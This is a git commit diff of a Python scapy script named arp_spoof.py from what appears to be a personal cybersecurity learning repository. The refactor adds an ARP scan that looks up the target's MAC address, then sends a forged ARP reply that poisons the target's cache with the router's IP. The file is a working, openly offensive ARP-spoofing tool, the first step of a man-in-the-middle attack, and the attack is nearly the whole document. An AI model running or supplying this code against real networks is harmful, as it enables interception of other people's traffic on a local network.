7265eaed7d81d22297b74824443ab2c7919668c2
tylerkain <tyler.kain@outlook.com>
2023-04-18 15:23:13 -0500

    refactor: updated code

--- CyberSecurity-Program/arp_spoof.py
+++ CyberSecurity-Program/arp_spoof.py
@@ -1,15 +1,25 @@
 #!/usr/bin/env python 3
 import scapy.all as scapy
 
-target_ip = input("enter target ip:")
-target_mac = input("enter target mac address: ")
-router = input("router IP: ")
+ip = input("enter target ip: ")
+router_ip = input("router IP: ")
 
 
-def create_packet(ip, mac, router_ip):
-    packet = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=router_ip)
-    return packet
+def scan(ip):
+    """Scan Network For Connected Devices"""
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
 
 
-arp_packet = create_packet(target_ip, target_mac, router)
-scapy.send(arp_packet)
+def create_packet(target_ip, spoof_ip):
+    MAC = scan(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=MAC, psrc=spoof_ip)
+    scapy.send(packet)
+
+
+create_packet(ip, router_ip)
+print(create_packet(ip, router_ip))
+
